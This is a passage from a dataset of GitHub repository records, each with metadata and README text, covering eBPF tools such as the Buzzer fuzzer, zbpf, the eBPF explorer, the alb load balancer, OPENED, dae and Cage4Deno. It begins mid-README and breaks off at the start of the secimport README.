## Development

Netreap is written in pure Go, no other build tools are required other than a
working Go toolchain.

On the other hand, actually using it is a bit more difficult. You need the
following things set up on a Linux machine:

* Consul agent running (no special configuration required, can just use `-dev`
  if you want)
* Nomad configured to use Docker volumes
* Cilium installed using the directions in [Running Cilium](###Running-Cilium).

### Testing

Because of all of the necessary pieces described in the previous section, we
don't have any automated tests in place yet. For now, here are some steps to
test manually:

* Start a job and then start netreap with the `--debug` flag, making sure the
  logs say that it is labeling it
* Run `cilium endpoint list` and make sure the endpoint is showing a label that
  looks something like this: `netreap:job_id=example`
* Stop the job and make sure the logs note that the reap counter was
  incremented
* Start a job and make sure the logs note that it saw the new job. Run `cilium
  endpoint list` to make sure the endpoint was properly labeled
* Stop netreap and then start it again, making sure the logs say that it is
  deleting an endpoint (from the previous job you stopped). Run `cilium
  endpoint list` to make sure the endpoint was properly deleted.
"
google/buzzer,466,37,466,8,Go,,2023-03-21T13:22:02Z,2025-10-07T19:36:58Z,238,"# Buzzer - An eBPF Fuzzer toolchain

![ci_status](https://github.com/google/buzzer/actions/workflows/ci.yml/badge.svg)


Buzzer is a fuzzer toolchain that allows to write eBPF _fuzzing strategies_.

A Fuzzing strategy is a way to generate random eBPF Programs and then validate
that they don't have unexpected behaviour.

To run the fuzzer follow the next steps

1. Install [bazel](https://bazel.build/).
1. Install [clang](https://clang.llvm.org/)
1. Setup the correct CC and CXX env variables
   ```
   export CC=clang
   export CXX=clang++
   ```
1. Run 
    ```
    bazel build :buzzer
    ```
1. Run buzzer either as root:
    ```
    sudo ./bazel-bin/buzzer_/buzzer
    ```
   
   OR with CAP_BPF:

    ```
    sudo setcap CAP_BPF=eip bazel-bin/buzzer_/buzzer
    ./bazel-bin/buzzer_/buzzer
    ```
## Documents:

* [Overall Architecture of Buzzer](docs/architecture/architecture.md)
* [How to run buzzer with coverage](docs/guides/running_with_coverage.md)

## Trophies
Did you find a cool bug using _Buzzer_? Let us know via a pull request! 
We'd like to collect all issues discovered with this framework under this
section.

* [CVE-2023-2163](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=71b547f561247897a0a14f3082730156c0533fed):
  An error in the branch pruning logic of the eBPF verifier can cause unsafe
  paths to not be explored. The unsafe pruned paths are the actual paths taken
  at runtime which causes a mismatch in what the verifier thinks the values of 
  certain registers are versus what they actually are. This mismatch can be
  abused to read/write arbitrary memory in the kernel by using the confused
  registers as base registers for memory operations.

* [CVE-2024-41003](https://github.com/google/security-research/security/advisories/GHSA-hfqc-63c7-rj9f):
  A bug in the verifier's register limit tracking allows an attacker to trick
  the verifier into thinking a register holds a value of 0 when at run time
  this register could take a value of 1. This can be then leveraged to achieve
  arbitrary kernel memory read/write and lead to a local privilege escalation
  or container escape.
"
facebookincubator/dns,283,30,283,4,Go,Collection of Meta's DNS Libraries,2022-10-04T18:03:41Z,2025-10-11T06:24:13Z,190,"# DNS
[![lint](https://github.com/facebook/dns/actions/workflows/lint.yml/badge.svg)](https://github.com/facebook/dns/actions/workflows/lint.yml)
[![test](https://github.com/facebook/dns/actions/workflows/test.yml/badge.svg)](https://github.com/facebook/dns/actions/workflows/test.yml)
[![codecov](https://codecov.io/gh/facebook/dns/branch/main/graph/badge.svg?token=ZX57JNHD7G)](https://codecov.io/gh/facebook/dns)
[![Go Report Card](https://goreportcard.com/badge/github.com/facebook/dns/dnsrocks)](https://goreportcard.com/report/github.com/facebook/dns/dnsrocks)
[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)


# Contents


- [Documentation](#Documentation)
- [License](#License)

## Documentation
Collection of Meta's DNS Libraries



### dnsrocks
Meta's authoritative dns server

### dnswatch
Meta's dns snooping utility

### goose
Meta's dns loadtesting utility

# License
fbdns is licensed under Apache 2.0 as found in the [LICENSE file](LICENSE).
"
tw4452852/zbpf,199,10,199,2,Zig,Writing eBPF in Zig,2023-04-11T01:46:45Z,2025-10-09T04:08:47Z,191,"# zbpf
Writing eBPF in Zig. Thanks to Zig's comptime and BTF, we can equip eBPF with strong type system both at comptime and runtime!

## Notable advantages when writing eBPF program with `zbpf`

### Different available methods based on the type of program's context

Suppose you want to trace the kernel function [path_listxattr](https://github.com/torvalds/linux/blob/7475e51b87969e01a6812eac713a1c8310372e8a/fs/xattr.c#L856-L857),
and here's its prototype:

```
static ssize_t path_listxattr(const char __user *pathname, char __user *list,
			      size_t size, unsigned int lookup_flags)
```
As you can see, it has 4 input parameters and return type is `ssize_t`.
With `ctx = bpf.Kprobe{.name = ""path_listxattr""}.Ctx()`, you could retrieve
the input parameter with `ctx.arg0()`, `ctx.arg1()`, `ctx.arg2()` and `ctx.arg3()` respectively,
and return value with `ctx.ret()`.
the type will be consistent with the above prototype. If you try to access a non-existing
parameter, e.g. `ctx.arg4()`, you will get a compilation error.

This also applies to `syscall` with `bpf.Ksyscall`, `tracepoint` with `bpf.Tracepoint` and
`fentry` with `bpf.Fentry`.

### No more tedious error handling

When writing in C, you always have to check the error conditions
(the return value of the helper function, pointer validation, ...)
With `zbpf`, you won't care about the these cases, we handle it under the hood for you,
just focus on the business logic.

The following are some examples:

- `bpf.Map` takes care BPF map's `update` and `delete` error.
- `bpf.PerfEventArray` handles event output failure.
- `bpf.RingBuffer` also handles space reservation.
- `bpf.Xdp` validates the pointer for you.

If some error happens, you could get all the information (file, line number, return value ...)
you need to debug in the kernel trace buffer:

```
~> sudo bpftool prog tracelog
test-11717   [005] d..21 10990692.273976: bpf_trace_printk: error occur at src/bpf/map.zig:110 return -2
```

## How to use

## Prerequisite

- Make sure the linux kernel is built with `CONFIG_DEBUG_INFO_BTF=y`.

## Build

- Download the [lastest Zig](https://ziglang.org/download/).
- Clone this repostory.
- Build with `zig build zbpf -Dbpf=/path/to/your/bpf/prog.zig -Dmain=/path/to/your/main.zig`.

For cross-compiling, you could specify the target with `-Dtarget=<target>`,
the list of all supported targets could be retrieved by `zig targets`.

Moreover, you could specify the target kernel with `-Dvmlinux=/path/to/vmlinux`
to extract BTF from it, otherwise, current kernel's BTF will be used.

That's all! The generated binary is located at `./zig-out/bin/zbpf`,
feel free to run it on your target machine.

Here's the [Documentations generated by Zig's AutoDoc](https://tw4452852.github.io/zbpf)
for you reference.

## Tools/trace

`trace` is a tool built on top of `zbpf` framework to trace kernel functions, syscalls and userspace functions.
It's heavily inspired by [retsnoop](https://github.com/anakryiko/retsnoop).
One improvement I made (which is also what I feel when using retsnoop) is that `trace` support
show parameters according its type (thanks to the Zig type system).
This is very helpful when debugging linux kernel and userspace program.
For more details, you could check the implementation: [BPF side](https://github.com/tw4452852/zbpf/blob/main/src/tools/trace/trace.bpf.zig)
and [Host side](https://github.com/tw4452852/zbpf/blob/main/src/tools/trace/trace.zig).

You could specify the kernel functions you want to trace with: `zig build trace -Dkprobe=<kernel_function_name> -Dkprobe=...`
And for system calls: `zig build trace -Dsyscall=<syscall_name> -Dsyscall=...`.
Or userspace function: `zig build trace -Duprobe=/path/to/binary[function_name]`.
Moreover, if you also want to capture the function's arguments, append the argument specifier, something like this:
`-Dkprobe=<kernel_function_name>:arg0,arg1...`, it also supports access to the deeper field if the argument is a pointer to a struct:
`-Dkprobe=<kernel_function_name>:arg0.field1.field0`.
You could even control how the argument is shown by using all the supported specifier by Zig's `std.fmt`, something like this:
`-Dkprobe=<kernel_function_name>:arg0.field1.field0/x` will show `arg0.field1.field0` in hexadecimal notation.
Capturing call stack is also supported, append keyword `stack`, for example `-Dkprobe=<kernel_function_name>:arg0,stack`.

And here's a quick demo:

[![asciicast](https://asciinema.org/a/675689.svg)](https://asciinema.org/a/675689)

For reference:
- Syscalls: https://tw4452852.github.io/zbpf/#vmlinux.kernel_syscalls
- Kernel functions: https://tw4452852.github.io/zbpf/#vmlinux.kernel_funcs

Want to use your local specific linux kernel? No problem, you could set up the documentation locally with:
```
zig build docs [-Dvmlinux=/path/your/vmlinux]
```
Then browse the generated page which is located at `./zig-out/docs/index.html`.
Search for `vmlinux.kernel_syscalls` and `vmlinux.kernel_funcs` for syscalls and kernel functions respectively.

## Samples

For each supported feature, we have the corresponding unit test.
You could find them under `samples/` (BPF side) and `src/tests` (Host side).
Build it with `zig build test -Dtest=<name>` and run it with `sudo zig-out/bin/test`.

Name | BPF side | Host side
--- | --- | ---
exit | [source](samples/exit.zig) | [source](src/tests/exit.zig)
panic | [source](samples/panic.zig) | [source](src/tests/panic.zig)
trace_printk | [source](samples/trace_printk.zig) | [source](src/tests/trace_printk.zig)
array | [source](samples/array.zig) | [source](src/tests/array.zig)
hash | [source](samples/hash.zig) | [source](src/tests/hash.zig)
perf_event | [source](samples/perf_event.zig) | [source](src/tests/perf_event.zig)
ringbuf | [source](samples/ringbuf.zig) | [source](src/tests/ringbuf.zig)
tracepoint | [source](samples/tracepoint.zig) | [source](src/tests/tracepoint.zig)
iterator | [source](samples/iterator.zig) | [source](src/tests/iterator.zig)
fentry | [source](samples/fentry.zig) | [source](src/tests/fentry.zig)
kprobe | [source](samples/kprobe.zig) | [source](src/tests/kprobe.zig)
kmulprobe | [source](samples/kmulprobe.zig) | [source](src/tests/kmulprobe.zig)
xdp ping | [source](samples/xdp_ping.zig) | [source](src/tests/xdp_ping.zig)
kfunc | [source](samples/kfunc.zig) | [source](src/tests/kfunc.zig)
stack_trace | [source](samples/stacktrace.zig) | [source](src/tests/stacktrace.zig)
uprobe | [source](samples/uprobe.zig) | [source](src/tests/uprobe.zig)
tc_ingress | [source](samples/tc_ingress.zig) | [source](src/tests/tc_ingress.zig)
lpm_trie | [source](samples/lpm_trie.zig) | [source](src/tests/lpm_trie.zig)

**Have fun!**
"
unibg-seclab/Cage4Deno,13,0,13,0,Rust,Set of modifications for Deno to add subprocess sandboxing,2023-05-23T09:24:17Z,2024-12-02T11:31:13Z,5874,"# Cage4Deno

This repository contains all the code and data necessary for building 
Cage4Deno, tool presented in our paper 
[Cage4Deno: A Fine-Grained Sandbox for Deno Subprocesses](https://cs.unibg.it/seclab-papers/2023/ASIACCS/paper/cage4deno.pdf).

## Abstract
Deno is a runtime for JavaScript and TypeScript that is receiving
great interest by developers, and is increasingly used for the 
construction of back-ends of web applications. A primary goal of Deno
is to provide a secure and isolated environment for the execution of
JavaScript programs. It also supports the execution of subprocesses,
unfortunately without providing security guarantees.
In this work we propose *Cage4Deno*, a set of modifications to
Deno enabling the creation of fine-grained sandboxes for the 
execution of subprocesses. The design of Cage4Deno satisfies the
compatibility, transparency, flexibility, usability, security, 
and performance needs of a modern sandbox. The realization of these
requirements partially stems from the use of Landlock and eBPF,
two robust and efficient security technologies. Significant attention
has been paid to the design of a flexible and compact policy model
consisting of **RWX** permissions, which can be automatically created,
and deny rules to declare exceptions. The sandbox effectiveness
is demonstrated by successfully blocking a number of exploits for
recent CVEs, while runtime experiments prove its efficiency. The
proposal is associated with an open-source implementation.
"
ebpfdev/explorer,91,0,91,9,Dockerfile,eBPF explorer is Web UI that lets you see all the maps and programs in eBPF subsystem,2023-05-28T16:49:40Z,2025-07-31T13:28:57Z,17,"# eBPF explorer

eBPF is a web UI that lets you explore eBPF subsystem of your Linux host.

Explorer consists of two parts: an agent with GraphQL API, Prometheus scrape endpoint, and a web interface.
It is currently shipped as a single container. But you can also run them separately.

* [ebpfdev/dev-agent](https://github.com/ebpfdev/dev-agent), MIT license
* [ebpfdev/explorer-ui](https://github.com/ebpfdev/explorer-ui), MIT license

## Features

* view all maps and programs
* view graph of interconnected maps and programs
* view program's tracepoints/kprobe
* map entries table (Hash, HashPerCPU, Array, ArrayPerCPU)
  * view and edit in number/hex/string formats
* expose map entries as metrics for prometheus (also other useful metrics)

![map editor demo gif](docs/pics/X_004RN_mapedit.gif)

## Usage

Run explorer as a container:

```shell
docker run -ti --rm -p 8070:80 \
  --cap-add CAP_SYS_ADMIN --pid=host \
  -e BPF_DIR=/sys/fs/bpf -v /sys/fs/bpf:/sys/fs/bpf \
  ghcr.io/ebpfdev/explorer:v0.0.7
```

Privileges breakdown:

* `--cap-add CAP_SYS_ADMIN` (**required**)

  is needed for access BPF maps and programs (CAP_BPF is not yet enough)

* `--pid=host` (_optional_)

  is needed to determine tracepoint/kprobe attachment

* `-e BPF_DIR=/sys/fs/bpf -v /sys/fs/bpf:/sys/fs/bpf` (_optional_)
  
  is needed to determine paths of pinned maps, it is better to keep BPF_DIR (and target mount path)
  the same as your original eBPF FS, which can be determined with the following command:
  ```shell
  $ mount | grep bpf
  bpf on /sys/fs/bpf type bpf
  ```


Use `--etm` option to expose map (with name `AT_`) entries values to Prometheus endpoint:
```shell
docker run -ti --rm -p 8070:80 \
  --cap-add CAP_SYS_ADMIN --pid=host \
  -e BPF_DIR=/sys/fs/bpf -v /sys/fs/bpf:/sys/fs/bpf \
  ghcr.io/ebpfdev/explorer:v0.0.7 --etm -:AT_:string
```

If you only need GraphQL / Prometheus without web interface, you can run [agent](https://github.com/ebpfdev/dev-agent) independently:
```shell
docker run -ti --rm -p 8080:8080 \
  --cap-add CAP_SYS_ADMIN --pid=host \
  -e BPF_DIR=/sys/fs/bpf -v /sys/fs/bpf:/sys/fs/bpf \
  ghcr.io/ebpfdev/dev-agent:v0.0.5 server
```

Links:
* [http://localhost:8070](http://localhost:8070) - web interface
* [http://localhost:8070/dev-agent](http://localhost:8070/dev-agent) - Agent's GraphQL web client
* [http://localhost:8070/dev-agent/metrics](http://localhost:8070/dev-agent/metrics) - Prometheus scrape endpoint

# Demo

Run the explorer as described above and open [http://localhost:8070](http://localhost:8070) in your browser.

You should see a file tree view with a list of eBPF programs and maps:

![List of maps](docs/pics/00-start.png)

Let's use [bpftrace](https://github.com/iovisor/bpftrace) to track amount of data read by each process:
```shell
$ sudo bpftrace -e 'tracepoint:syscalls:sys_exit_read /args->ret/ { @[comm] = sum(args->ret); }'
Attaching 1 probe...
```

Once you run it, list will be automatically updated:

![A list of maps containing two new maps](docs/pics/01-list-with-bpftrace.png)

`...`

![A list of programs with the new sys_exit_read](docs/pics/02-list-with-sys_exit_read.png)

Let's examine the `sys_exit_read` program:

![sys_exit_read program page](docs/pics/03-sys_exit_read-page.png)

We can see that this new program is using a new map called `AT_`.
Which probably means that it contains state of `@` variable of the program generated by `bpftrace`.

There is also `printf` map of type PerfEventArray. It is probably used by `printf()` invocation within `bpftrace` programs
and created regardless of whatever you actually use it or not: out program doesnt use it therefore we also
don't see that is used by the program in UI.

We can proceed to the `AT_` map page:

![Page of the AT map](docs/pics/04-at-map-page.png)

On the `Entries` subpage we can examine current state of the map:

![Entries table of the AT map state](docs/pics/05-at-map-page-entries.png)

Values are formatted as numbers by default if value size <= 8 bytes. Otherwise, they are displayed as hex strings.

We can also switch `KEY` representation to `string`:

![Entries table of the AT map state with string keys](docs/pics/06-at-map-page-entries-repr.png)

# Prometheus scrape endpoint

There is a scrape endpoint for Prometheus available at `/metrics` path:
```shell
% curl http://localhost:8070/metrics
# HELP devagent_ebpf_map_count Number of eBPF maps
# TYPE devagent_ebpf_map_count gauge
devagent_ebpf_map_count{type=""Hash""} 5
devagent_ebpf_map_count{type=""PerCPUHash""} 1
devagent_ebpf_map_count{type=""PerfEventArray""} 1
# HELP devagent_ebpf_map_entry_count Number of entries in an eBPF map
# TYPE devagent_ebpf_map_entry_count gauge
devagent_ebpf_map_entry_count{id=""14"",name=""AT_"",type=""PerCPUHash""} 351
# HELP devagent_ebpf_map_entry_value Value of an eBPF map entry
# TYPE devagent_ebpf_map_entry_value gauge
devagent_ebpf_map_entry_value{cpu=""0"",id=""14"",key=""(xtract-3)"",name=""AT_"",type=""PerCPUHash""} 0
devagent_ebpf_map_entry_value{cpu=""0"",id=""14"",key=""000resolvconf"",name=""AT_"",type=""PerCPUHash""} 0
# (...)
devagent_ebpf_map_entry_value{cpu=""15"",id=""14"",key=""01-ifupdown"",name=""AT_"",type=""PerCPUHash""} 0
# (...)
# HELP devagent_ebpf_prog_count Number of eBPF programs
# TYPE devagent_ebpf_prog_count gauge
devagent_ebpf_prog_count{type=""CGroupDevice""} 19
devagent_ebpf_prog_count{type=""CGroupSKB""} 10
devagent_ebpf_prog_count{type=""TracePoint""} 1
# HELP devagent_ebpf_prog_run_count Number of times an eBPF program has been run
# TYPE devagent_ebpf_prog_run_count gauge
devagent_ebpf_prog_run_count{id=""112"",name="""",tag=""03b4eaae2f14641a"",type=""CGroupDevice""} 0
devagent_ebpf_prog_run_count{id=""113"",name="""",tag=""03b4eaae2f14641a"",type=""CGroupDevice""} 0
devagent_ebpf_prog_run_count{id=""114"",name="""",tag=""03b4eaae2f14641a"",type=""CGroupDevice""} 54
devagent_ebpf_prog_run_count{id=""118"",name=""sys_exit_read"",tag=""90964a143ba6aa2c"",type=""TracePoint""} 2.866732e+06
devagent_ebpf_prog_run_count{id=""127"",name="""",tag=""3918c82a5f4c0360"",type=""CGroupDevice""} 7
# (...)
# HELP devagent_ebpf_prog_run_time Total time spent running eBPF programs
# TYPE devagent_ebpf_prog_run_time gauge
devagent_ebpf_prog_run_time{id=""112"",name="""",tag=""03b4eaae2f14641a"",type=""CGroupDevice""} 0
devagent_ebpf_prog_run_time{id=""113"",name="""",tag=""03b4eaae2f14641a"",type=""CGroupDevice""} 0
devagent_ebpf_prog_run_time{id=""114"",name="""",tag=""03b4eaae2f14641a"",type=""CGroupDevice""} 6.857e-05
devagent_ebpf_prog_run_time{id=""118"",name=""sys_exit_read"",tag=""90964a143ba6aa2c"",type=""TracePoint""} 1.405393686
devagent_ebpf_prog_run_time{id=""127"",name="""",tag=""3918c82a5f4c0360"",type=""CGroupDevice""} 2.314e-06
# (...)
```

By default, metrics `devagent_ebpf_map_entry_count` and `devagent_ebpf_map_entry_value` are disabled.
To enable them for some of the maps (Array or Hash types), use `--etm option`, for the demo above:
```shell
docker run -ti --rm -p 8070:80 \
  --cap-add CAP_SYS_ADMIN --pid=host \
  -e BPF_DIR=/sys/fs/bpf -v /sys/fs/bpf:/sys/fs/bpf \
  ghcr.io/ebpfdev/explorer:v0.0.7 --etm -:AT_:string
```

Run with `--help` to see details of this option:
```shell
% docker run -ti --rm ghcr.io/ebpfdev/explorer:v0.0.7 --help               

  (edited)

   --entries-to-metrics value, --etm value [ --entries-to-metrics value, --etm value ]  (experimental, api may change)
    Configure which map entries should be exposed as metrics, in the format: id_start-id_end:metric_name_regexp:key_format.
    Example: '-:.+:string' to export any map with non-empty name while treating key as string.
    or '10-:.*:hex' to export any map after ID 10 with key represented in HEX format
    Available key formats: string, number, hex
    If a map matches multiple entries, the first one is used.

  (edited)
```

Some interesting visualization you could build with this data:

Programs run statistics:
![07-grafana-ebpf.png](docs/pics/07-grafana-ebpf.png)

Amount of system calls per process:
![08-grafana-syscallnum.png](docs/pics/08-grafana-syscallnum.png)

## Features

- [x] list of eBPF programs + details page
- [x] list of eBPF maps + details page
- [x] showing bounded maps of a programs (and vice versa)
- [ ] showing map content
  - [x] Hash (+ per CPU)
  - [x] Array (+ per CPU)
  - [ ] others are planned
- [ ] program introspection
  - [ ] eBPF bytecode
  - [ ] JIT disassembly
- [ ] visualization of map's content

    Like plotting a chart of values of maps keys
- [ ] program execution profiling
    
    I plan to keep track of duration/number of executions of a programs provided by kernel
    to draw nice charts
- [ ] cluster support

    To traverse over a cluster of agents within a single interface

Feedback and suggestions are welcome in [GitHub Issues](https://github.com/ebpfdev/explorer/issues) or via [alex@hsslb.ch](mailto:alex@hsslb.ch)

"
therealak12/alb,11,0,11,0,Go,Yet another Load Balancer using BPF ,2023-04-26T18:58:49Z,2024-05-24T17:49:58Z,14,"# bfp load balancer

## Notes

1. The project is inspired by [lizrice lb from scratch](https://github.com/lizrice/lb-from-scratch)
   and [katran](https://github.com/facebookincubator/katran)

2. ALB uses xdp-generic mode. Using xdp-native mode requires extra work such as attaching a dummy xdp_pass program to
   all involved interfaces. Refer
   to [this](https://github.com/xdp-project/xdp-tutorial/tree/master/packet03-redirecting#sending-packets-back-to-the-interface-they-came-from)
   for more explanation.

## Structure
![ALB Structure](imgs/structure.png)

## Prerequisites

### Install bpf2go

```shell
go install github.com/cilium/ebpf/cmd/bpf2go@latest
```

### Install libbfp

```shell
git clone https://github.com/libbpf/libbpf.git /tmp/libbpf
cd /tmp/libbpf/src
make -j`nproc`
BUILD_STATIC_ONLY=1 NO_PKG_CONFIG=1 make install
```

### Install bpftool

```shell
rm /usr/sbin/bpftool

apt update && apt install -y git
cd / && git clone --recurse-submodules https://github.com/libbpf/bpftool.git

cd bpftool/src
make install

ln -s /usr/local/sbin/bpftool /usr/sbin/bpftool
```

### Generate bpf2go boilerplate

```shell
make generate
```

## Develop

### Setup environment

```shell
make setup-dev-env
```

### Run

```shell
make run-in-ns NS=alb
```

### Send Request to ALB

Make sure http servers are listening on port 80 in ns1 and ns2, then run:

```shell
sudo ip netns exec client curl 172.16.31.2
```

### Clean environment

```shell
make clean-dev-env
```
"
shun159/play-sched-ext,0,0,0,0,C,memo,2023-03-28T15:05:53Z,2023-08-15T17:16:58Z,26,"Learning BPF extensible scheduler class (a.k.a sched-ext)
---
I have summarized the key points in the [slide](https://github.com/shun159/play-sched-ext/blob/main/learning_sched_ext.pdf). If you are interested in the feature, I hope the slide will be helpful to you."
eBPFDevSecTools/opened,14,6,14,20,Python,"OPENED Tool to extract specific eBPF functions from large monoliths (tested on Katran, Mizar, Cilium..)",2022-11-18T05:59:37Z,2025-08-03T18:30:08Z,335,"# OPENED Extraction Tool

LPC 2022 blurb describing the goal of the tool and an initial prototype is here: https://lpc.events/event/16/contributions/1370/ 
 
## Dependencies
 1. Works on a) kernel verion 5.4.0-131, Ubuntu 22:04, Intel arch x86 arch b) Dockerfile works with Wondows 10, WSL2+Docker Desktop with Ubuntu 22.04 App from MS store. There is a known issue with Apple Silicon based Macbooks with installing a) ``gcc-multlib`` b) TXL and c) Codequery, described [here](https://github.com/eBPFDevSecTools/opened/issues/37)
 2. git
 3. Docker
 
## Download
 1. Run ``git clone git@github.com:eBPFDevSecTools/opened.git`` followed by ``git submodule update --init --recursive``
 2. ``cd opened``
 3. To update the submodules a) ``git submodule update --remote --merge`` b) ``cd codequery; git pull``
 
## Install 
### Process 1: Docker
 1. ``mkdir op`` To store the output of extraction phase (or any other folder name)
 2. ``docker build . -t opened/extract:0.01``

### Process 2: On Host
 1. **For now:** You will need to parse the Dockerfile and execute the installation steps on your host system.
 2. In future we will provide a script for on-host installation ([Issue #24](https://github.com/eBPFDevSecTools/opened/issues/24)).
 
## Updating local branch
 1. run ``git pull``
 2. run ``git submodule update --recursive`` 
 3. If you have docker for install, you are done. 
 4. If you have on-host install, you will need to re-install ``codequery`` by running the relevant instructions from Dockerfile.

## Extraction code and artefacts
Code extraction consists of three phases 1) Determining the necessary functions and data-structures to be copied, 2) (Manual) disambiguation of the target set of functions identified in previous step and 3) Extracting required code from source files to generate an independantly compilable module.


### Phase I: Determining necessary functions and data-structures for extracting specific functionality
1. Run annotated function call graph extraction phase, 
```
python3 src/extraction_runner.py --help
usage: extraction_runner.py [-h] -s SRC_DIR -f FUNCTION_NAME [-d DB_FILE_NAME] [-g FUNCTION_CALL_GRAPH_PATH] -r REPO_NAME

optional arguments:
  -h, --help            show this help message and exit
  -s SRC_DIR, --src_dir SRC_DIR
                        directory with source code
  -f FUNCTION_NAME, --function_name FUNCTION_NAME
                        function name to be extracted
  -d DB_FILE_NAME, --db_file_name DB_FILE_NAME
                        Optional sqlite3 database with cqmakedb info
  -g FUNCTION_CALL_GRAPH_PATH, --function_call_graph_path FUNCTION_CALL_GRAPH_PATH
                        directory to put function and map dependency call graph file. Output of phase I
  -r REPO_NAME, --repo_name REPO_NAME
                        Project repository name

```
NOTE:  **example is given in run2.sh**.

### Phase II
1. Open the func.out file and remove the duplicate function and struct definitions.  This will output an annotated function call graph in a file named func.out. Note that func.out may have duplicate function defintions. We expect the developer to disambiguate and identify the required set of functions to be extracted in Phase II.

### Phase III: Extracting Required Code
2. Run the function extractor to extract and dump required functions and map definitions.

```
python3 src/function-extractor.py -h
usage: function-extractor.py [-h] -o OPDIR -c CODEQUERYOUTPUTFILE -e EXTRACTEDFILENAME -t STRUCT_INFO -f FUNC_INFO -s SRCDIR -b BASEDIR [--isCilium]

Function Extractor

optional arguments:
  -h, --help            show this help message and exit
  -o OPDIR, --opdir OPDIR
                        directory to dump extracted files to
  -c CODEQUERYOUTPUTFILE, --codequeryOutputFile CODEQUERYOUTPUTFILE
                        Function and Map dependency output from codequery
  -e EXTRACTEDFILENAME, --extractedFileName EXTRACTEDFILENAME
                        Output file with extracted function
  -t STRUCT_INFO, --struct_info STRUCT_INFO
                        json file containing struct definitions in the repo
  -f FUNC_INFO, --func_info FUNC_INFO
                        json file containing function definitions in the repo
  -s SRCDIR, --srcdir SRCDIR
                        Directory containing source files for function to be extraced from
  -b BASEDIR, --basedir BASEDIR
                        Base Directory path relative to which directory structure in opdir will be created
  --isCilium            whether repository is cilium
```
Note that  STRUCT_INFO and FUNC_INFO are generated using the [annotator](https://github.com/eBPFDevSecTools/ebpf-projects-annotations/blob/master/ANNOTATION_GENERATOR.md) script in the [eBPF-projects-annotations repo](https://github.com/eBPFDevSecTools/ebpf-projects-annotations) 

Note that extracted.c may contain duplicate eBPF Map defintions within and ```ATTENTION``` section. We expect the developer to choose the right map definition and delete the offending defintion.


*Compilation*

Run `make` to compile the extracted code.
"
daeuniverse/dae,4639,288,4639,109,Go,eBPF-based Linux high-performance transparent proxy solution.,2023-01-23T11:53:16Z,2025-10-12T13:58:43Z,825,"# dae

<img src=""https://github.com/daeuniverse/dae/blob/main/logo.png"" border=""0"" width=""25%"">

<p align=""left"">
    <img src=""https://github.com/daeuniverse/dae/actions/workflows/build.yml/badge.svg"" alt=""Build""/>
    <img src=""https://custom-icon-badges.herokuapp.com/github/license/daeuniverse/dae?logo=law&color=orange"" alt=""License""/>
    <img src=""https://custom-icon-badges.herokuapp.com/github/v/release/daeuniverse/dae?logo=rocket"" alt=""version"">
    <img src=""https://custom-icon-badges.herokuapp.com/github/issues-pr-closed/daeuniverse/dae?color=purple&logo=git-pull-request&logoColor=white""/>
    <img src=""https://custom-icon-badges.herokuapp.com/github/last-commit/daeuniverse/dae?logo=history&logoColor=white"" alt=""lastcommit""/>
</p>

**_dae_**, means goose, is a high-performance transparent proxy solution.

To enhance traffic split performance as much as possible, dae employs the transparent proxy and traffic split suite within the Linux kernel using eBPF. As a result, dae can enable direct traffic to bypass the proxy application's forwarding, facilitating genuine direct traffic passage. Through this remarkable feat, there is minimal performance loss and negligible additional resource consumption for direct traffic.

As a successor of [v2rayA](https://github.com/v2rayA/v2rayA), dae abandoned v2ray-core to meet the needs of users more freely.

## Features

- [x] Implement `Real Direct` traffic split (need ipforward on) to achieve [high performance](https://docs.google.com/spreadsheets/d/1UaWU6nNho7edBNjNqC8dfGXLlW0-cm84MM7sH6Gp7UE/edit?usp=sharing).
- [x] Support to split traffic by process name in local host.
- [x] Support to split traffic by MAC address in LAN.
- [x] Support to split traffic with invert match rules.
- [x] Support to automatically switch nodes according to policy. That is to say, support to automatically test independent TCP/UDP/IPv4/IPv6 latencies, and then use the best nodes for corresponding traffic according to user-defined policy.
- [x] Support advanced DNS resolution process.
- [x] Support full-cone NAT for shadowsocks, trojan(-go) and socks5 (no test).
- [x] Support various trending proxy protocols, seen in [proxy-protocols.md](./docs/en/proxy-protocols.md).

## Getting Started

Please refer to [Quick Start Guide](./docs/en/README.md) to start using `dae` right away!

## Notes

1. If you setup dae and also a shadowsocks server (or any UDP servers) on the same machine in public network, such as a VPS, don't forget to add `l4proto(udp) && sport(your server ports) -> must_direct` rule for your UDP server port. Because states of UDP are hard to maintain, all outgoing UDP packets will potentially be proxied (depends on your routing), including traffic to your client. This behaviour is not what we want to see. `must_direct` makes all traffic from this port including DNS traffic direct.
1. If users in mainland China find that the first screen time is very long when they visit some domestic websites for the first time, please check whether you use foreign DNS to handle some domestic domain in DNS routing. Sometimes this is hard to spot. For example, `ocsp.digicert.cn` is included in `geosite:geolocation-!cn` unexpectedly, which will cause some tls handshakes to take a long time. Be careful to use such domain sets in DNS routing.

## How it works

See [How it works](./docs/en/how-it-works.md).

## TODO

- [ ] Automatically check dns upstream and source loop (whether upstream is also a client of us) and remind the user to add sip rule.
- [ ] MACv2 extension extraction.
- [ ] Log to userspace.
- [ ] Protocol-oriented node features detecting (or filter), such as full-cone (especially VMess and VLESS).
- [ ] Add quick-start guide
- [ ] ...

## Contributors

Special thanks goes to all [contributors](https://github.com/daeuniverse/dae/graphs/contributors). If you would like to contribute, please see the [instructions](./docs/en/development/contribute.md). Also, it is recommended following the [commit-msg-guide](./docs/en/development/commit-msg-guide.md).

## License

[AGPL-3.0 (C) daeuniverse](https://github.com/daeuniverse/dae/blob/main/LICENSE)

## Stargazers over time

[![Stargazers over time](https://starchart.cc/daeuniverse/dae.svg)](https://starchart.cc/daeuniverse/dae)
"
avilum/secimport,224,17,224,2,Python,"The first open-source eBPF sandbox for Python (macOS/Linux): Secure libraries, block RCE, and enforce precise syscall control. Dive into module & package-level security now.",2022-07-02T21:51:32Z,2025-10-06T09:27:08Z,179,"# secimport
![macOS](https://img.shields.io/badge/Platform-macOS-blue)
![Linux](https://img.shields.io/badge/Platform-Linux-blue)

[![Upload Python Package](https://github.com/avilum/secimport/actions/workflows/python-publish.yml/badge.svg)](https://github.com/avilum/secimport/actions/workflows/python-publish.yml)

<!-- ![](https://img.shields.io/badge/Test_Coverage-90%-blue) -->

## Module-Level Sandboxing for Python Applications

secimport is an eBPF-based security toolkit that enforces syscall restrictions per Python module, providing granular control over your application's security profile. Think of it as seccomp-bpf for Linux, but operating at the Python module level.

[<a href=""https://star-history.com/#avilum/secimport&Date"">
Â <picture>
